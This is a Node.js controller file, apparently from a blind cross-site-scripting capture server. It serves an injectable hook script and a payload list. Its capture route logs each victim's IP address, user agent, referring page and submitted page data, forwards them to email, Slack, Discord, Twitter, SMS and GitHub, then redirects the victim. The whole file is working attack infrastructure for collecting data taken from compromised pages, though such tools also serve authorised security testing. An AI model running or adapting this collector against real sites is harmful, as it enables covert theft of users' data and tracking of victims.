const uuid = require('uuid/v1');

const config = require('server/utilities/config');
const template = require('server/utilities/templates/script');
const payloads = require('server/utilities/payloads');
const Domain = require('server/utilities/domain');

const reporters = [
  require('server/utilities/services/email'),
  require('server/utilities/services/slack'),
  require('server/utilities/services/discord'),
  require('server/utilities/services/spark'),
  require('server/utilities/services/twitter'),
  require('server/utilities/services/sms'),
  require('server/utilities/services/github'),
  require('server/utilities/save')
];

/* eslint-disable no-shadow */
function reportToUtilities(guid, domain, config) {
  reporters.forEach(svc => svc.send(guid, domain, config));
}

exports.displayScript = (req, res) => {
  res.type('.js');
  res.send(template.generateTemplate(config));
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.generatePayloads = (req, res) => {
  res.set('Content-Type', 'text/plain');
  res.send(payloads.generatePayloads(config));
};

exports.capture = (req, res) => {
  let domain = {};
  const guid = uuid();
  if (req.body._) {
    domain = Domain.fromPayload(req.body._, config);
  } else {
    domain = new Domain(config);
    domain.url = req.get('referer') || null;
  }
  domain.victimIP =
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress ||
    null;
  domain.userAgent = req.headers['user-agent'] || null;

  reportToUtilities(guid, domain, config);

  res.redirect(domain.url);
};
